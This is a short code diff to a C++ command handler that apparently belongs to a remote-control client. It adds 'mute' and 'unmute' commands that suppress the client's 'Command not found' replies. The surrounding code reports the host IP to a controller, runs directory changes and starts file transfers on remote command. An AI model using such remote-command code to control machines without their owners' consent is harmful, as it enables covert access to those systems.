@@ -41,6 +41,14 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 	{
 		client->send_b(Auto::get_ip().c_str());
 	}
+	else if (args[0] == "mute" && args.size() == 1)
+	{
+		client->setMute(1);
+	}
+	else if (args[0] == "unmute" && args.size() == 1)
+	{
+		client->setMute(0);
+	}
 	  // ----------------------------------- SYSTEM COMMAND -----------------------------------
 	else if (args[0] == "cd" && args.size() == 2)
 	{
@@ -112,7 +120,10 @@ Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pb
 		Transfer::ask(client, args[1], args[2]);
 	}
 	else
-		client->send_b(("Command " + buffer + " not found").c_str());
+		if (!client->getMute())
+		{
+			client->send_b(("Command " + buffer + " not found").c_str());
+		}
 
 }
 
